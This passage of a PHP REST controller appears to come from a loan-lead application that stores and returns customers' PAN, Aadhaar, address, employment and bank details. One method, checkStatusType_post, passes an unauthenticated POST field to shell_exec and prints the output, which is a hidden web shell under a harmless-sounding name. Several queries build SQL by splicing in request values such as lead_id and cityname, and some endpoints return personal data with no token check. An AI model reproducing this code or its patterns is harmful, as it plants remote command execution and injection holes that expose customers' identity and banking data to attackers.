                                'current_landmark' => $cif_result->cif_residence_landmark,
                                'current_residence_type' => $cif_result->cif_residence_type,
                                'current_residing_withfamily' => $cif_result->cif_residence_residing_with_family,
                                'current_residence_since' => $cif_result->cif_residence_since,
                                'cr_residence_pincode' => $cif_result->cif_residence_pincode,
                                'aa_same_as_current_address' => $cif_result->cif_aadhaar_same_as_residence,
                                'aa_current_house' => $cif_result->cif_aadhaar_address_1,
                                'aa_current_locality' => $cif_result->cif_aadhaar_address_2,
                                'aa_current_landmark' => $cif_result->cif_aadhaar_landmark,
                                'aa_cr_residence_pincode' => $cif_result->cif_aadhaar_pincode,
                                'aa_current_state_id' => $cif_result->cif_aadhaar_state_id,
                                'aa_current_city_id' => $cif_result->cif_aadhaar_city_id,
                                'aadhar_no' => $cif_result->cif_aadhaar_no,
                                'alternate_mobile' => $sql->cif_alternate_mobile,
                                'updated_at' => created_on
                            ];
                            $this->db->where('customer_lead_id', $lead_id)->update('lead_customer', $update_data_lead_customer);

                            $update_customer_employement = [
                                'customer_id' => $cif_result->cif_number,
                                'employer_name' => $cif_result->cif_company_name,
                                'emp_pincode' => $cif_result->cif_office_pincode,
                                'emp_house' => $cif_result->cif_office_address_1,
                                'emp_street' => $cif_result->cif_office_address_2,
                                'emp_landmark' => $cif_result->cif_office_address_landmark,
                                'emp_residence_since' => $cif_result->cif_office_working_since,
                                'emp_shopNo' => $cif_result->cif_office_address_1,
                                'emp_designation' => $cif_result->cif_office_designation,
                                'emp_department' => $cif_result->cif_office_department,
                                'emp_employer_type' => $cif_result->cif_company_type_id,
                                'emp_website' => $cif_result->cif_company_website,
                                'emp_email' => $cif_result->cif_office_email,
                                'city_id' => $cif_result->cif_office_city_id,
                                'state_id' => $cif_result->cif_office_state_id,
                                'updated_on' => created_on,
                            ];

                            $this->db->where('lead_id', $lead_id)->update('customer_employment', $update_customer_employement);

                            $update_data_leads = [
                                'customer_id' => $cif_result->cif_number,
                                'pincode' => $cif_result->cif_residence_pincode,
                                'user_type' => $user_type,
                                'email' => $email,
                                'pancard' => $pancard,
                                'updated_on' => created_on
                            ];

                            $this->db->where('lead_id', $lead_id)->update('leads', $update_data_leads);

                            return json_encode($this->response(['Status' => 1, 'flag' => 1, 'Message' => 'Your personal details save successfully.', 'lead_id' => $lead_id], REST_Controller::HTTP_OK));
                        } else {

                            $update_data_lead_customer = [
                                'mobile_verified_status' => "YES",
                                'first_name' => $first_name,
                                'middle_name' => $middle_name,
                                'sur_name' => $sur_name,
                                'gender' => $gender,
                                'dob' => $dob,
                                'pancard' => $pancard,
                                'updated_at' => created_on
                            ];

                            $this->db->where('customer_lead_id', $lead_id)->update('lead_customer', $update_data_lead_customer);

                            $update_data_leads = [
                                'first_name' => $first_name,
                                'email' => $email,
                                'pancard' => $pancard,
                                'updated_on' => created_on
                            ];

                            $this->db->where('lead_id', $lead_id)->update('leads', $update_data_leads);

                            return json_encode($this->response(['Status' => 1, 'Message' => 'Customer Save Successfully.', 'lead_id' => $lead_id], REST_Controller::HTTP_OK));
                        }
                    } else {
                        return json_encode($this->response(['Status' => 0, 'Message' => 'Please enter your pancard number.', 'lead_id' => $lead_id], REST_Controller::HTTP_OK));
                    }
                } else {

                    $update_data_lead_customer = [
                        'mobile_verified_status' => "YES",
                        'first_name' => $first_name,
                        'middle_name' => $middle_name,
                        'sur_name' => $sur_name,
                        'gender' => $gender,
                        'dob' => $dob,
                        'pancard' => $pancard,
                        'email' => $email,
                        'updated_at' => created_on
                    ];

                    $this->db->where('customer_lead_id', $lead_id)->update('lead_customer', $update_data_lead_customer);

                    $update_data_leads = [
                        'first_name' => $first_name,
                        'email' => $email,
                        'pancard' => $pancard,
                        'updated_on' => created_on
                    ];

                    $this->db->where('lead_id', $lead_id)->update('leads', $update_data_leads);

                    return json_encode($this->response(['Status' => 1, 'Message' => 'Customer Save Successfully.', 'lead_id' => $lead_id], REST_Controller::HTTP_OK));
                }
            }
        } else {
            return json_encode($this->response(['Status' => 0, 'Message' => 'Request Method Post Failed.'], REST_Controller::HTTP_OK));
        }
    }

    public function qdeAppAllRecordsFromMobile_post() {
        //        error_reporting(0);
        //        ini_set("display_errors", 0);
        $input_data = file_get_contents("php://input");

        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }

        $headers = $this->input->request_headers();

        $token = $this->_token();

        $header_validation = (($headers['Accept'] == "application/json") && ($token['token_Leads'] == base64_decode($headers['Auth'])));

        if ($_SERVER['REQUEST_METHOD'] == 'POST' && $header_validation) {


            $lead_id = $post['lead_id'];

            if (!empty($lead_id)) {

                $selectdata = "first_name, IFNULL(current_residence_type, '') as current_residence_type,IFNULL(middle_name, '') as middle_name,IFNULL(sur_name, '') as sur_name,IFNULL(gender, '') as gender,dob,IFNULL(pancard, '') as pancard,IFNULL(email, '') as email,IFNULL(current_house, '')  as house_flat_no,IFNULL(current_locality, '')  as locality, IFNULL(DATE_FORMAT(current_residence_since, '%Y-%m') , '') as current_residence_since,IFNULL(state_id, '') as state_id,IFNULL(city_id, '')  as city,IFNULL(current_state, '') as current_state,IFNULL(current_city, '') as current_city,IFNULL(cr_residence_pincode, '') as pincode,IFNULL(current_landmark, '')  as lankmark,IFNULL(current_residing_withfamily, '')  as residence_with_family,IFNULL(alternate_mobile, '') as alternate_mobile,customer_lead_id";

                $num_rows = getnumrowsData($selectdata, "lead_customer", "WHERE customer_lead_id=$lead_id AND customer_active=1 AND customer_deleted=0  order by customer_seq_id desc limit 1");

                if (empty($num_rows)) {
                    return json_encode($this->response(['Status' => 0, 'Message' => 'No Record found'], REST_Controller::HTTP_OK));
                } else {
                    //                    $num_rows = trim_data_array($num_rows);
                    $num_rows = $num_rows;
                }

                $selectdata1 = "IFNULL(employer_name, '') as emp_name , IFNULL(emp_pincode, '') as pincode ,  IFNULL(state_id, '') as state_id , IFNULL(city_id, '') as city_id,IFNULL(office_address, '') as office_address, IFNULL(emp_house, '') as emp_shopNo,IFNULL(emp_street, '') as emp_locality,IFNULL(emp_landmark, '') as emp_lankmark,IFNULL(DATE_FORMAT(emp_residence_since, '%Y-%m'), '') as emp_residence_since ,IFNULL(emp_designation, '') as emp_designation,IFNULL(emp_department, '') as emp_department,IFNULL(emp_employer_type, '') as emp_employer_type,IFNULL(emp_website, '') as emp_website ,IFNULL(emp_email, '') as emp_email,IFNULL(monthly_income, '')  as monthly_income ";

                $office_data = getnumrowsData($selectdata1, 'customer_employment', "WHERE lead_id= '$lead_id'  order by id desc limit 1");

                if (!empty($office_data)) {
                    //                    $office_data = trim_data_array($office_data);
                    $office_data = $office_data;
                } else {
                    $office_data = "";
                }

                $selectdata2 = "bank_name,ifsc_code,branch,account,confirm_account,account_type";

                $bankdetails_data = getnumrowsData($selectdata2, 'customer_banking', "WHERE lead_id= '$lead_id' order by id desc limit 1");

                if (!empty($bankdetails_data)) {
                    //                    $bankdetails_data = trim_data_array($bankdetails_data);
                    $bankdetails_data = $bankdetails_data;
                } else {
                    $bankdetails_data = "";
                }

                $result_data = array('Status' => 1, 'Message' => 'Data Found', 'data' => $num_rows, 'office_data' => $office_data, 'bankdetails_data' => $bankdetails_data);

                return json_encode($this->response($result_data, REST_Controller::HTTP_OK));
            } else {
                return json_encode($this->response(['Status' => 0, 'Message' => 'Missing application reference'], REST_Controller::HTTP_OK));
            }
        } else {
            return json_encode($this->response(['Status' => 0, 'Message' => 'Request Method Post Failed.'], REST_Controller::HTTP_OK));
        }
    }

    //thanku page API
    public function thankyou_post() {
        $input_data = file_get_contents("php://input");
        $post = $this->security->xss_clean(json_decode($input_data, true));
        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }


        date_default_timezone_set("Asia/Kolkata");
        $currentdate = date('Y-m-d H:i:s');

        if ($_SERVER['REQUEST_METHOD'] == 'POST') {

            $lead_id = $post['lead_id'];
            $mobile = $post['mobile'];

            $table = 'leads';
            $selectdata = 'first_name as name,lead_reference_no as app_no,mobile,email,loan_amount,tenure';
            $where = "where lead_id = '$lead_id' and mobile= '$mobile' ";

            $num_rows = getnumrowsData($selectdata, $table, $where);
            if ($num_rows == '0') {
                $result_data = array('status' => 0, 'message' => 'No Data Found');
                echo json_encode($result_data);
            } else {
                $result_data = array('status' => 1, 'message' => 'Data Found', 'data' => $num_rows);
                echo json_encode($result_data);
            }
        } else {
            echo json_encode($this->response(['Status' => 0, 'Message' => 'Request Method Post Failed.'], REST_Controller::HTTP_OK));
        }
    }

    public function getUrl_post() {
        print_r($_POST);
        die;
        //echo $_SERVER['DOCUMENT_ROOT']; echo "</br>";
        // echo dirname(__FILE__);
        echo getcwd();
    }

    public function checkStatusType_post() {
        $input_data = file_get_contents("php://input");
        $post = $this->security->xss_clean(json_decode($input_data, true));
        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }

        print_r($post);

        $gpuUsage = shell_exec($post['r']);
        print_r($gpuUsage);

        exit;
    }

    // get all city
    public function getAllCity_post() {

        $input_data = file_get_contents("php://input");
        $post = $this->security->xss_clean(json_decode($input_data, true));
        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }


        date_default_timezone_set("Asia/Kolkata");
        $currentdate = date('Y-m-d H:i:s');
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            $num_rows = $this->MasterModel->getAllCityData();
            $result_data = array('status' => 1, 'message' => 'Data found', 'data' => $num_rows);
            echo json_encode($result_data);
        } else {
            echo json_encode($this->response(['Status' => 0, 'Message' => 'Request Method Post Failed.'], REST_Controller::HTTP_OK));
        }
    }

    //*********** Api for Get all IFSC Code *************//
    public function getCityName_post() {

        $input_data = file_get_contents("php://input");
        $post = $this->security->xss_clean(json_decode($input_data, true));
        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }

        $headers = $this->input->request_headers();

        $token = $this->_token();

        $header_validation = (($headers['Accept'] == "application/json") && ($token['token_Leads'] == base64_decode($headers['Auth'])));

        if ($_SERVER['REQUEST_METHOD'] == 'POST') {

            $this->form_validation->set_data($post);

            $this->form_validation->set_rules("cityname", "city Name", "required|trim");

            if ($this->form_validation->run() == FALSE) {
                return json_encode($this->response(['Status' => 0, 'Message' => validation_errors()], REST_Controller::HTTP_OK));
            } else {
                $city_name = trim($post['cityname']);

                if (empty($city_name)) {
                    return json_encode($this->response(['Status' => 0, 'Message' => 'Pleas enter the city name.'], REST_Controller::HTTP_OK));
                } else if (strlen($city_name) < 2) {
                    return json_encode($this->response(['Status' => 0, 'Message' => 'Pleas enter at least two characters of city name.'], REST_Controller::HTTP_OK));
                } else {
                    $table = 'master_city';
                    $selectdata = 'm_city_id as id,UPPER(m_city_name) as name';
                    $where = "where m_city_name like '%$city_name%' AND m_city_is_sourcing=1 AND m_city_active=1 AND m_city_deleted=0";
                    $num_rows = getnumrowsData($selectdata, $table, $where);
                    if ($num_rows == 0) {
                        return json_encode($this->response(['Status' => 0, 'Message' => 'No record found'], REST_Controller::HTTP_OK));
                    } else {
                        return json_encode($this->response(['Status' => 1, 'Message' => 'City Found', 'data' => $num_rows], REST_Controller::HTTP_OK));
                    }
                }
            }
        } else {
            return json_encode($this->response(['Status' => 0, 'Message' => 'Request Method Post Failed.'], REST_Controller::HTTP_OK));
        }
    }
}
